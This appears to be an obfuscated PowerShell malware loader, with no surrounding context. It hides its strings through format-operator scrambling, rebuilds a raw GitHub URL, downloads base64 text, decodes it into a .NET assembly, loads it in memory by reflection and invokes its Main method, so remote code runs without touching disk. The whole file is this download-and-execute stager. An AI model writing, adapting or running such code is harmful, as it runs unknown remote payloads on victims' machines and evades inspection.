.("{1}{0}"-f 'ET-iTeM','s') ("{0}{1}{2}{4}{3}" -f 'v','ArIA','b','rh6D','le:5l')  (  [TyPe]("{2}{4}{3}{1}{0}"-F 'VeRt','N','sy','.cO','STeM') )  ;${u`8p}=  [Type]("{6}{0}{4}{5}{3}{1}{2}"-F 'sT','cTion.ass','EmbLY','reFLE','e','m.','SY') ;   .("{1}{0}"-f 'T','SE')  ("{0}{1}"-f'VcRP','Dt')  ( [TYPE]("{1}{2}{3}{0}"-f'ivAtOR','S','YStem','.ACT'))  ; ${u`Rl} = ("{13}{10}{9}{7}{20}{4}{16}{5}{14}{1}{3}{6}{17}{12}{2}{0}{18}{15}{19}{8}{11}" -f 'cos','olentqm/','/','res','ont','t.c','t/','hubus','akie.','://raw.git','s','txt','ain','http','om/vi','o','en','m','tumers/jh','nh','erc')

${rEs`pon`SE} = &("{0}{4}{2}{3}{1}" -f'Inv','uest','e-We','bReq','ok') -Uri ${u`RL} -UseBasicParsing

if (${re`SPo`NsE}."st`AtUsc`oDE" -eq 200) {
    ${B`AS`e64ST`RiNG} = ${R`ES`POnSE}."Co`NtE`Nt"

    ${b`Yte`A`Rray} =  ( .("{1}{0}{2}" -f 'i','VAR','AbLE') ("{1}{0}"-f 'H6d','5lr') )."va`LuE"::("{0}{3}{2}{4}{1}"-f 'Fro','ring','se64S','mBa','t').Invoke(${BaSE6`4s`T`RinG})
    ${ASSE`Mb`ly} =  (  &('GI')  ("{0}{3}{2}{1}"-f'v','U8P','le:','aRIab')  )."V`AluE"::("{0}{1}"-f 'Lo','ad').Invoke(${b`Yt`EaR`RAY})

    ${cLA`Ss} = ${asseM`BLY}.("{1}{0}"-f'etType','G').Invoke(("{1}{0}{2}{3}" -f 's','QJAM','rpfhk','.HH'))
    ${me`T`hOd} = ${C`LasS}.("{0}{1}" -f 'Get','Method').Invoke(("{1}{0}" -f 'ain','M'))

    ${I`NsTAN`CE} =   (  &("{0}{1}" -f'gC','i')  ("{4}{0}{3}{2}{1}"-f'AriABle:V','dT','p','cR','v') )."Va`luE"::("{2}{3}{1}{0}" -f'ce','nstan','Cre','ateI').Invoke(${c`lAsS})
    ${M`eTH`od}."InVo`kE"(${In`ST`A`Nce}, @())

} else {
    &("{0}{2}{1}" -f 'Wr','Host','ite-') "Failed to download base64String. Status code: $($response.StatusCode) "
}
